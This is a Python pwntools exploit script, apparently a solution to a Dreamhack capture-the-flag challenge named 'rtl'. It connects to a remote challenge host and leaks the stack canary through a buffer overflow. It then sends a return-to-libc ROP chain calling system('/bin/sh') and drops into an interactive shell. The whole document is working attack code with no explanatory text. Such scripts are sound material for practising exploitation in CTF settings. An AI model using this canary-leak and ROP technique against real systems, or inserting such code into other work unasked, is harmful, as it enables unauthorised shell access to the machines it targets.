#! /bin/usr/python3

from pwn import *

def slog(name, addr):
    return success(' : '.join([name, hex(addr)]))

p = remote("host1.dreamhack.games", 22421)
e = ELF("./rtl")
libc = e.libc
rop = ROP(e)

context.arch = 'amd64'

buf2sfp = 0x40
buf2cnry = buf2sfp - 0x8
payload = b'A' * (buf2cnry + 1)
p.sendafter('Buf:', payload)
p.recvuntil(payload)
cnry = u64(b'\x00' + p.recvn(7))

slog("Cnry", cnry) 

system_plt = e.symbols['system']
sh = next(e.search(b'/bin/sh'))
pop_rdi = rop.find_gadget(['pop rdi'])[0]
ret = rop.find_gadget(['ret'])[0]

payload = b'A' * buf2cnry
payload += p64(cnry)
payload += b'A' * 0x8
payload += p64(ret) + p64(pop_rdi) + p64(sh) + p64(system_plt)

p.sendafter("Buf: ", payload)

p.interactive()